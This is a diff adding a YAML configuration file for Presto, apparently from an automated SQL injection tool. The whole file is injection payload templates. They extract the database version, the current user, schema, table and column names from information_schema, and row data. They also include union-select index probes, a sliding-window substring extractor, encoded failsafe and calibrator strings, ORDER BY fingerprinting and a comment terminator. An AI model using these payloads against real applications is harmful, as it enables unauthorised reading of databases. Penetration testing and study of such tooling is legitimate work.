@@ -1,0 +1,144 @@
+vendor: Presto
+# docker run -p 8080:8080 --name presto prestosql/presto
+# jdbc:presto://127.0.0.1:8078/system
+# test
+
+resource:
+ info: |
+  select concat(
+         concat_ws(
+             '${enclose_value_sql}',
+             'version()',
+             'database()',
+             current_user
+         ),
+         '${trail_sql}'
+     )
+
+ schema:
+  database: |
+   select array_join(
+       array_agg(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}'
+           || q
+           || '${enclose_value_sql}'
+           || ''
+       ),
+       '${separator_cell_sql}'
+   )
+   || '${trail_sql}' 
+   from (
+       select distinct
+           table_schema r,
+           '0' q
+       from information_schema.columns
+       ${limit}
+   ) x
+
+  table: |
+   select array_join(
+       array_agg(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}'
+           || q
+           || '${enclose_value_sql}'
+           || ''
+       ),'${separator_cell_sql}'
+   )
+   || '${trail_sql}' 
+   from (
+       select distinct
+           table_name r,
+           '0' q
+       from information_schema.columns
+       where table_schema = '${database}'
+       ${limit}
+   ) x   
+
+  column: |
+   select array_join(
+       array_agg(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}'
+           || q
+           || '${enclose_value_sql}'
+           || ''
+       ),
+       '${separator_cell_sql}'
+   ) 
+   || '${trail_sql}' 
+   from (
+       select distinct
+           column_name r,
+           '0' q
+       from information_schema.columns
+       where table_schema = '${database}'
+       and table_name = '${table}'
+       ${limit}
+   ) x   
+
+  row:
+   query: |
+    select array_join(
+        array_agg(
+            '${enclose_value_sql}'
+            || r
+            || '${separator_qte_sql}'
+            || q
+            || '${enclose_value_sql}'
+            || ''
+        ),
+        '${separator_cell_sql}'
+    ) 
+    || '${trail_sql}' 
+    from (
+        select
+            cast(schema_name as varchar) r,
+            cast(count(*) as varchar) q
+        from ${database}.${table}
+        group by 1
+        ${limit}
+    ) x    
+   fields:
+    field: trim(coalesce(${field.value}, ''))
+    concat: "||'%7f'||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   (
+       select
+           concat(
+               '${lead}',
+               substr(
+                   (${injection}),
+                   ${window.char},
+                   ${capacity}
+               )
+           )
+   )
+  limit: offset ${limit.value} limit 65536
+  failsafe: cast(1337${indice}7330%2b1 as varchar)
+  calibrator: array_join(repeat('${calibrator_sql}', 10000),'')
+  limitBoundary: 0
+  endingComment: --+-
+  fingerprint:
+   errorMessage:
+    - presto
+   orderByErrorMessage:
+    - ORDER BY position 1337 is not in select list
+
+ normal:
+  indices: union select ${indices}
+  capacity: |
+   (
+       select 
+           '${lead}'
+           || '${indice}'
+           || ${calibrator}
+   )
+  orderBy: order by 1337
